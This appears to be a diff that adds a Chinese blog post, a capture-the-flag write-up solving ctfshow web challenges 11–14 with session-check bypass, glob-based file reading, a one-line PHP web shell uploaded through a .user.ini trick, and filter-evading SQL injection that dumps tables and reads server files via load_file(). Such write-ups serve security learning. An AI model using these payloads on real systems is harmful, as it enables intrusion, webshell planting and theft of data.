@@ -1,0 +1,354 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ctfshow web11-14 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="web11题目源码
+123456789101112131415161718192021222324252627&amp;lt;?php    function replaceSpecialChar($str,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ctfshow web11-14</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ctfshow web11-14</h1>
+        <div class="stuff">
+            <span>八月 15, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctfshow%E5%88%B7%E9%A2%98/" rel="tag">ctfshow刷题</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> preg_replace(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$password</span>)!=strlen(replaceSpecialChar(<span class="variable">$password</span>)))&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>解题</strong></p>
+<ol>
+<li>利用Session变量存储信息：</li>
+</ol>
+<p>$_SESSION[“Session名称”]=变量或字符串信息;</p>
+<p><strong>Session采用的是在服务器端保持状态的方案，而Cookie采用的是在客户端保持状态的方案。在PHP配置中的默认情况下，Session是用Session ID来确定当前对话所对应的服务器Session，而Session ID是通过Cookie来传递的，禁用Cookie相当于失去了Session ID，也就得不到Session了。</strong></p>
+<p><strong>因此在代码中我们可以看到当</strong>$password==$_SESSION[‘password’]<strong>成立时，就会输出flag。</strong></p>
+<ol start="2">
+<li><strong>进行bp抓包，cookie中包含了一个phpsession的值，传进来的参数通过get方式传递，如果我们将密码置换为空，将cookie删掉，那么就能使得条件成立，输出flag。</strong></li>
+</ol>
+<p><img src="1.png"></p>
+<p><img src="2.png"></p>
+<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>打开题目，网页源码注释提示说cmd传参，一看到cmd就先用了system进行命令执行，但是都没啥返回结果，后来看了题目的hint提示，glob绕过和highlight看源码。</p>
+<p>所以就去百度了一下glob的绕过：</p>
+<ul>
+<li>glob是linux下一种文件匹配模式,Glob 不匹配任何隐藏文件或文件夹。</li>
+</ul>
+<p>匹配规则跟通配符比较相像：</p>
+<table>
+<thead>
+<tr>
+<th>*</th>
+<th>匹配除了斜杠(/)之外的所有字符。 Windows上是斜杠(/)和反斜杠()</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>**</td>
+<td>匹配零个或多个目录及子目录。不包含 . 以及 .. 开头的。</td>
+</tr>
+<tr>
+<td>?</td>
+<td>匹配任意单个字符。</td>
+</tr>
+</tbody></table>
+<p>glob() 函数返回一个包含匹配指定模式的文件名或目录的数组。</p>
+<p>glob(“*”) 匹配任意文件</p>
+<p><img src="3.png"></p>
+<p>glob(“*.txt”)匹配以txt为后缀的文件</p>
+<p><img src="4.png"></p>
+<p>因此可以参照上述的用法，读取文件的目录，并使用print_r打印出来：</p>
+<p><strong>?cmd=print_r(glob(“*”));</strong></p>
+<p><img src="5.png"></p>
+<p>读取到一个文件，根据提示，使用highlight_file()函数对文件内容进行高亮显示：</p>
+<p><strong>?cmd=highlight_file(“903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php”);</strong></p>
+<p><img src="6.png"></p>
+<p>得到flag。</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filesystem-glob.html">https://www.runoob.com/php/func-filesystem-glob.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/104372662">https://blog.csdn.net/miuzzx/article/details/104372662</a></p>
+<h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51558360/article/details/115391693?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.control&spm=1001.2101.3001.4242">web</a>13</h3><ul>
+<li><strong><?php @eval($_POST['shell']) ?></strong></li>
+</ul>
+<p>最简单的一句话木马的工作原理：</p>
+<p>首先存在一个名为shell的变量，shell的取值为HTTP的POST方式。Web服务器对shell取值以后，然后通过eval()函数执行shell里面的内容。</p>
+<ul>
+<li>解题</li>
+</ul>
+<p>一开始看到界面就是问价上传，传了图片马回显图片size错误，扫描了一下目录发现存在upload.php.bak</p>
+<p>下载得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>); <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]; <span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]; <span class="variable">$arr</span> = pathinfo(<span class="variable">$filename</span>); <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>]; <span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123; 	<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>); &#125; <span class="keyword">if</span> (strlen(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123; 	<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>); &#125; <span class="keyword">if</span>(strlen(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123; 	<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>); &#125; <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123; 	<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);    &#125; <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123; 	<span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>; &#125;<span class="keyword">else</span>&#123; 	<span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>; &#125;  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>代码审计发现：</li>
+</ul>
+<p>文件的大小要小于等于24，名字长度小于等于9，后缀长度小于等于3，并且最要命的是后缀和名字都不能包含php。既然要小于等于24，所以可以将一句话木马写成这样：&lt;?php eval($_GET[‘a’]);</p>
+<ul>
+<li>对于php中的.usr.ini有如下解释：</li>
+</ul>
+<p>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.usr.ini中如果设置了文件名，那么同一目录下任意一个页面都会将该文件中的内容包含进去。</p>
+<p><img src="7.png"></p>
+<p>涉及到两个配置项：auto_prepend_file、auto_prepend_file</p>
+<p><img src="8.png"></p>
+<p>大致意思就是：我们指定一个文件（如a.txt），那么该文件就会被包含。</p>
+<p>auto_prepend_file:在页面顶部加载文件</p>
+<p>auto_append_file:在页面底部加载文件</p>
+<ul>
+<li>先上传a.txt   ：&lt;?php eval($_GET[‘a’]);</li>
+</ul>
+<p>然后上传.user.ini     </p>
+<p>添加如下payload即可。</p>
+<p>但是在这里上传成功访问的时候要多试几次，具体原因我也不知道，但是多上传几次，多访问几次就能有回显结果了。</p>
+<p><strong>upload.php/?a=print_r(glob(“*”));</strong></p>
+<p><img src="9.png"></p>
+<p><strong>upload.php/?a=highlight_file(“903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php”);</strong></p>
+<p><img src="10.png"></p>
+<p>题目主要涉及的还是文件上传时.user.ini文件的用法.</p>
+<p><a target="_blank" rel="noopener" href="https://wp.ctf.show/d/15-ctf-show-web13"><strong>https://wp.ctf.show/d/15-ctf-show-web13</strong></a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/awsole/p/14388357.html"><strong>https://www.cnblogs.com/awsole/p/14388357.html</strong></a></p>
+<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><ol>
+<li>进入界面得到一段代码，switch…case….判断。</li>
+</ol>
+<p>由于存在不认识的函数，所以我一开始是想着去查找函数的用法，并没有去读代码，想的是怎么绕过intval()和sleep()函数，但是后来发现这两个函数并不是关键的点。</p>
+<ul>
+<li><strong>intval()</strong> 函数用于获取变量的整数值。</li>
+</ul>
+<p>intval函数有两个参数：var和base：</p>
+<ul>
+<li>$var：要转换成 integer 的数量值。</li>
+<li>$base：转化所使用的进制。</li>
+</ul>
+<p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p>
+<ul>
+<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>
+<li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li>
+<li>将使用 10 进制 (decimal)。</li>
+</ul>
+<p><img src="11.png"></p>
+<ol start="2">
+<li>如果传入的参数为1的话输出URL并退出整个判断语句。但是输入1后并没有返回我们需要的东西，继续往下读取，但是由于存在sleep()函数，也不可能传入555555这么大的数进行等待返回，所以往下看到有一个3：</li>
+</ol>
+<p><img src="12.png"></p>
+<ol start="3">
+<li>当传入3时，输出@A@并一直往下执行到break跳出，打印出了我们一个文件名。</li>
+</ol>
+<p><img src="13.png"></p>
+<ol start="4">
+<li>尝试访问，进入一个查询界面，返回的是admin，看着像是一个SQL注入，查看网页源代码，发现过滤了information_schema.tables，information_schema.columns，nestring，空格，polygon。关键字。然后抓包尝试一下进行SQL注入。</li>
+</ol>
+<p><img src="14.png"></p>
+<ol start="5">
+<li>过滤了空格，使用/**/绕过，进行order by字段查询，发现只有一个回显位置。</li>
+</ol>
+<p><img src="15.png"></p>
+<ol start="6">
+<li>然后使用联合查询进行注入：</li>
+</ol>
+<p><strong>注：information_schema.tables使用反引号即information_schema.<code>tables</code>形式进行绕过。</strong></p>
+<p>爆数据库名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/here_1s_your_f1ag.php?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select(select<span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.`tables`<span class="comment">/**/</span>where<span class="comment">/**/</span>table_schema=<span class="string">&#x27;web&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>爆表名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/here_1s_your_f1ag.php?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select(select<span class="comment">/**/</span>group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.`columns`<span class="comment">/**/</span>where<span class="comment">/**/</span>table_name=<span class="string">&#x27;content&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>爆字段内容，发现并没有我们需要的flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/here_1s_your_f1ag.php?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select(select<span class="comment">/**/</span>group_concat(username,password)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>content)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="16.png"></p>
+<ol start="7">
+<li>一开始的代码中有一个文件包含的secret.php，使用MySQL的读取文件函数load_file()进行读取：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/here_1s_your_f1ag.php?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span>load_file(<span class="string">&#x27;/var/www/html/secret.php&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>返回：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;here_1s_your_f1ag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/tmp/gtf1y&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(trim(@file_get_contents(<span class="variable">$file</span>)) === <span class="string">&#x27;ctf.show&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/real_flag_is_here&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果/tmp/gtf1y中的内容为ctf.show则输出/real_flag_is_here中的值,我们可以直接使用load_file()函数读取/real_flag_is_here的内容：</p>
+<ol start="7">
+<li>直接读取得到flag：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/here_1s_your_f1ag.php?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span>load_file(<span class="string">&#x27;/real_flag_is_here&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>load_file()读取文件；空格的绕过，反引号的使用绕过。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/104373112">https://blog.csdn.net/miuzzx/article/details/104373112</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.pianshen.com/article/56841633720/">https://www.pianshen.com/article/56841633720/</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web11"><span class="toc-number">1.</span> <span class="toc-text">web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web12"><span class="toc-number">2.</span> <span class="toc-text">web12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web13"><span class="toc-number">3.</span> <span class="toc-text">web13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web14"><span class="toc-number">4.</span> <span class="toc-text">web14</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
